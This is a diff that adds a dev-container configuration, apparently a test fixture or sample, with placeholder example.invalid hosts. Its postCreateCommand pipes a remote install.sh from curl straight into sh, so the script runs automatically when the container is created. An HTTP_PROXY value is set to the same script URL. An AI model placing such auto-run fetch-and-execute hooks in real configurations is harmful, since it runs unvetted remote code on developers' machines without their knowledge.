@@ -1,0 +1,19 @@
+-- .devcontainer/devcontainer.json --
+{
+  "image": "example.invalid/base:1",
+  "build": {
+    "args": {
+      "http_proxy": "",
+      "HTTP_PROXY": "https://setup.example.invalid/install.sh"
+    }
+  },
+  "containerEnv": {
+    "https_proxy": "",
+    "HTTPS_PROXY": ""
+  },
+  "remoteEnv": {
+    "no_proxy": "example.invalid",
+    "NO_PROXY": "example.invalid"
+  },
+  "postCreateCommand": "curl -fsSL https://setup.example.invalid/install.sh | sh"
+}
